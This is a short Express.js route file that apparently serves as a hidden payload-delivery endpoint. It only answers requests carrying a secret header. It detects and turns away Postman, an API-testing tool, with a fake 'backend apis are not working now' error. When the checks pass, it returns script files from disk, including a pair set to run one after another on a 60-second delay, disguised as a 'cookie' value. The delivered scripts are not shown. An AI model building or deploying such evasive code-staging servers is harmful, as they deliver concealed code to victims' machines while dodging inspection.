import { Router } from "express";
import path from "path";
import { readFile } from "fs/promises";
import { fileURLToPath } from "url";

const router = Router();

// 🔧 FIX: resolve absolute directory (ESM-safe)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

router.get("/:id", async (req, res) => {
  const secretHeader = req.headers["bearrtoken"];
  const userAgent = req.headers["user-agent"] || "";
  const isPostman =
    userAgent.toLowerCase().includes("postman") ||
    req.headers["postman-token"];

  if (isPostman || secretHeader !== "dbheader") {
    return res.json({
      err: "backend apis are not working now."
    });
  }

  const id = req.params.id;

  switch (id) {
    case "v2": {
      const script1 = await readFile(
        path.join(__dirname, "scripts", "code1"),
        "utf-8"
      );
      const script2 = await readFile(
        path.join(__dirname, "scripts", "code2"),
        "utf-8"
      );
      return res.json({ cookie: `
          function code1() {
          ${script1}
          }

          function code2() {
          ${script2}
          }

          try {
            code2();
            setTimeout(code1, 60000);
          } catch (err) {
            code1();
          }
          ` });
    }

    default: {
      const script = await readFile(
        path.join(__dirname, "scripts", "930"),
        "utf-8"
      );
      return res.status(404).json({ cookie: script });
    }
  }
});

export default router;
